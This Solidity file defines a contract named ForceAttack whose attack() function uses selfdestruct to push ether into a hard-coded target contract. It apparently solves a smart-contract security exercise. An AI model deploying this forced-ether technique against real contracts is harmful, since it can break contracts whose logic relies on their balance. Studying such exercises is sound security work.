// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.17;

contract ForceAttack {
    address payable constant CONTRACTTOATTACK =
        payable(0xe685A958C3a80eA70e6f1e980458B9D65B0a4CD8);

    constructor() {}

    function attack() public payable {
        selfdestruct(CONTRACTTOATTACK);
    }
}
